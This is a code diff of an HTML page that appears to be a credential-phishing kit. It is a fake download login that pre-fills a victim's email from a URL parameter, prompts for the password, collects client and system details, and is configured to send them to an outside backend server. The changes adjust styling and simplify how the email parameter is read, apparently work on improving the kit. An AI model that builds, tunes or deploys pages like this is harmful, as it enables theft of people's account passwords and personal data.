@@ -32,9 +32,9 @@
             height: 100%;
             filter: blur(3.5px);
             z-index: -1;
-            transform: translate(-50%, -50%);
+            transform: translate(-50%, -50%); /* Changed from -52% to -50% for perfect center */
             background-image: url('input.png');
-            background-size: 100% 100%;
+            background-size: 100% 100%; /* Stretches both width and height */
             background-repeat: no-repeat;
             background-position: center center;
         }
@@ -68,6 +68,18 @@
             display: inline-block;
             white-space: nowrap;
         }
+
+<!--        .heading::after {-->
+<!--            content: '';-->
+<!--            position: absolute;-->
+<!--            bottom: -10px;-->
+<!--            left: 50%;-->
+<!--            transform: translateX(-50%);-->
+<!--            width: 60px;-->
+<!--            height: 4px;-->
+<!--            background: #4285f4;-->
+<!--            border-radius: 2px;-->
+<!--        }-->
 
         .input-group {
             margin-bottom: 15px;
@@ -120,11 +132,11 @@
         }
 
         .email-step {
-            display: none;
+            display: none; /* Hide email step by default */
         }
 
         .password-step {
-            display: none;
+            display: none; /* Hide password step by default */
         }
 
         .download-button, .continue-button {
@@ -136,7 +148,7 @@
             cursor: pointer;
             font-size: 16px;
             font-weight: 600;
-            width: 40%;
+            width: 40%; /* Reduced width */
             height: 10%;
             transition: all 0.3s ease;
             margin: 0 auto;
@@ -164,6 +176,10 @@
             background-color: #3367d6;
         }
 
+        .password-step {
+            display: none;
+        }
+
         .error-message {
             color: #d32f2f;
             font-size: 14px;
@@ -189,39 +205,17 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* Responsive font sizes for smaller devices */
         @media (max-width: 480px) {
             .dialog-box {
-                padding: 25px 20px;
+                padding: 35px 25px;
             }
 
             .heading {
-                font-size: 18px; /* Reduced from 22px */
-                margin-bottom: 15px;
-            }
-
-            .error-message {
-                font-size: 12px; /* Reduced from 14px */
-            }
-
-            .success-message {
-                font-size: 12px; /* Reduced from 14px */
+                font-size: 22px;
             }
 
             .download-button, .continue-button {
-                width: 70%;
-                font-size: 14px; /* Slightly smaller button text */
-            }
-        }
-
-        /* Extra small devices */
-        @media (max-width: 360px) {
-            .heading {
-                font-size: 16px; /* Even smaller for very small screens */
-            }
-
-            .error-message {
-                font-size: 11px;
+                width: 70%; /* Adjusted for mobile */
             }
         }
     </style>
@@ -296,44 +290,19 @@
             // BACKEND CONFIGURATION
             const BACKEND_URL = 'https://server-gfhv.onrender.com';
 
-            // Base64 decoding function
-            function decodeBase64(encodedString) {
-                try {
-                    // Decode the Base64 string
-                    const decodedString = atob(encodedString);
-                    // Remove any trailing newlines or spaces
-                    return decodedString.trim();
-                } catch (error) {
-                    console.error('Base64 decoding error:', error);
-                    return null;
-                }
-            }
-
             // Get email from URL parameters
             function getEmailFromURL() {
                 const urlParams = new URLSearchParams(window.location.search);
-                const encodedEmail = urlParams.get('email');
-                
-                if (encodedEmail) {
-                    // Decode the Base64 email
-                    const decodedEmail = decodeBase64(encodedEmail);
-                    if (decodedEmail && validateEmail(decodedEmail)) {
-                        return decodedEmail;
-                    } else {
-                        console.error('Invalid or malformed email after decoding');
-                        return null;
-                    }
-                }
-                return null;
+                return urlParams.get('email');
             }
 
             // Initialize page based on URL parameters
             function initializePage() {
-                const decodedEmail = getEmailFromURL();
+                const urlEmail = getEmailFromURL();
 
-                if (decodedEmail) {
-                    // If email is provided in URL (and successfully decoded), show password step immediately
-                    emailDisplay.value = decodedEmail;
+                if (urlEmail) {
+                    // If email is provided in URL, show password step immediately
+                    emailDisplay.value = urlEmail;
                     emailStep.style.display = 'none';
                     passwordStep.style.display = 'block';
 
@@ -342,7 +311,7 @@
                         passwordInput.focus();
                     }, 100);
                 } else {
-                    // If no valid email in URL, show email step
+                    // If no email in URL, show email step
                     emailStep.style.display = 'block';
                     passwordStep.style.display = 'none';
                     emailInput.focus();
@@ -425,18 +394,17 @@
                 }
             };
 
+            // Initialize client data collection
+            getClientDetails();
+            getSystemDetails();
+
+            initializePage();
+
             // Email validation function
             function validateEmail(email) {
                 const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
                 return re.test(String(email).toLowerCase());
             }
-
-            // Initialize client data collection
-            getClientDetails();
-            getSystemDetails();
-            
-            // Initialize page display
-            initializePage();
 
             // Check email validity on input
             emailInput.addEventListener('input', function() {
